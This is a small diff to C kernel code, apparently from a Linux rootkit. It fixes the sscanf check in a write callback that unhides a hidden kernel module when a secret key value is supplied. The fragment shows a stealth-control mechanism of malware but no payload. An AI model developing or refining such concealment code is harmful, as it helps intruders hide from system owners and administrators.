@@ -501,7 +501,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
             case Opt_unhide_module:
                 {
                     uint64_t val;
-                    if (sscanf(args[0].from, "%llx", &val) &&
+                    if ((sscanf(args[0].from, "%llx", &val) == 1) &&
                             UNHIDEKEY == val) {
                         kv_unhide_mod();
                     }
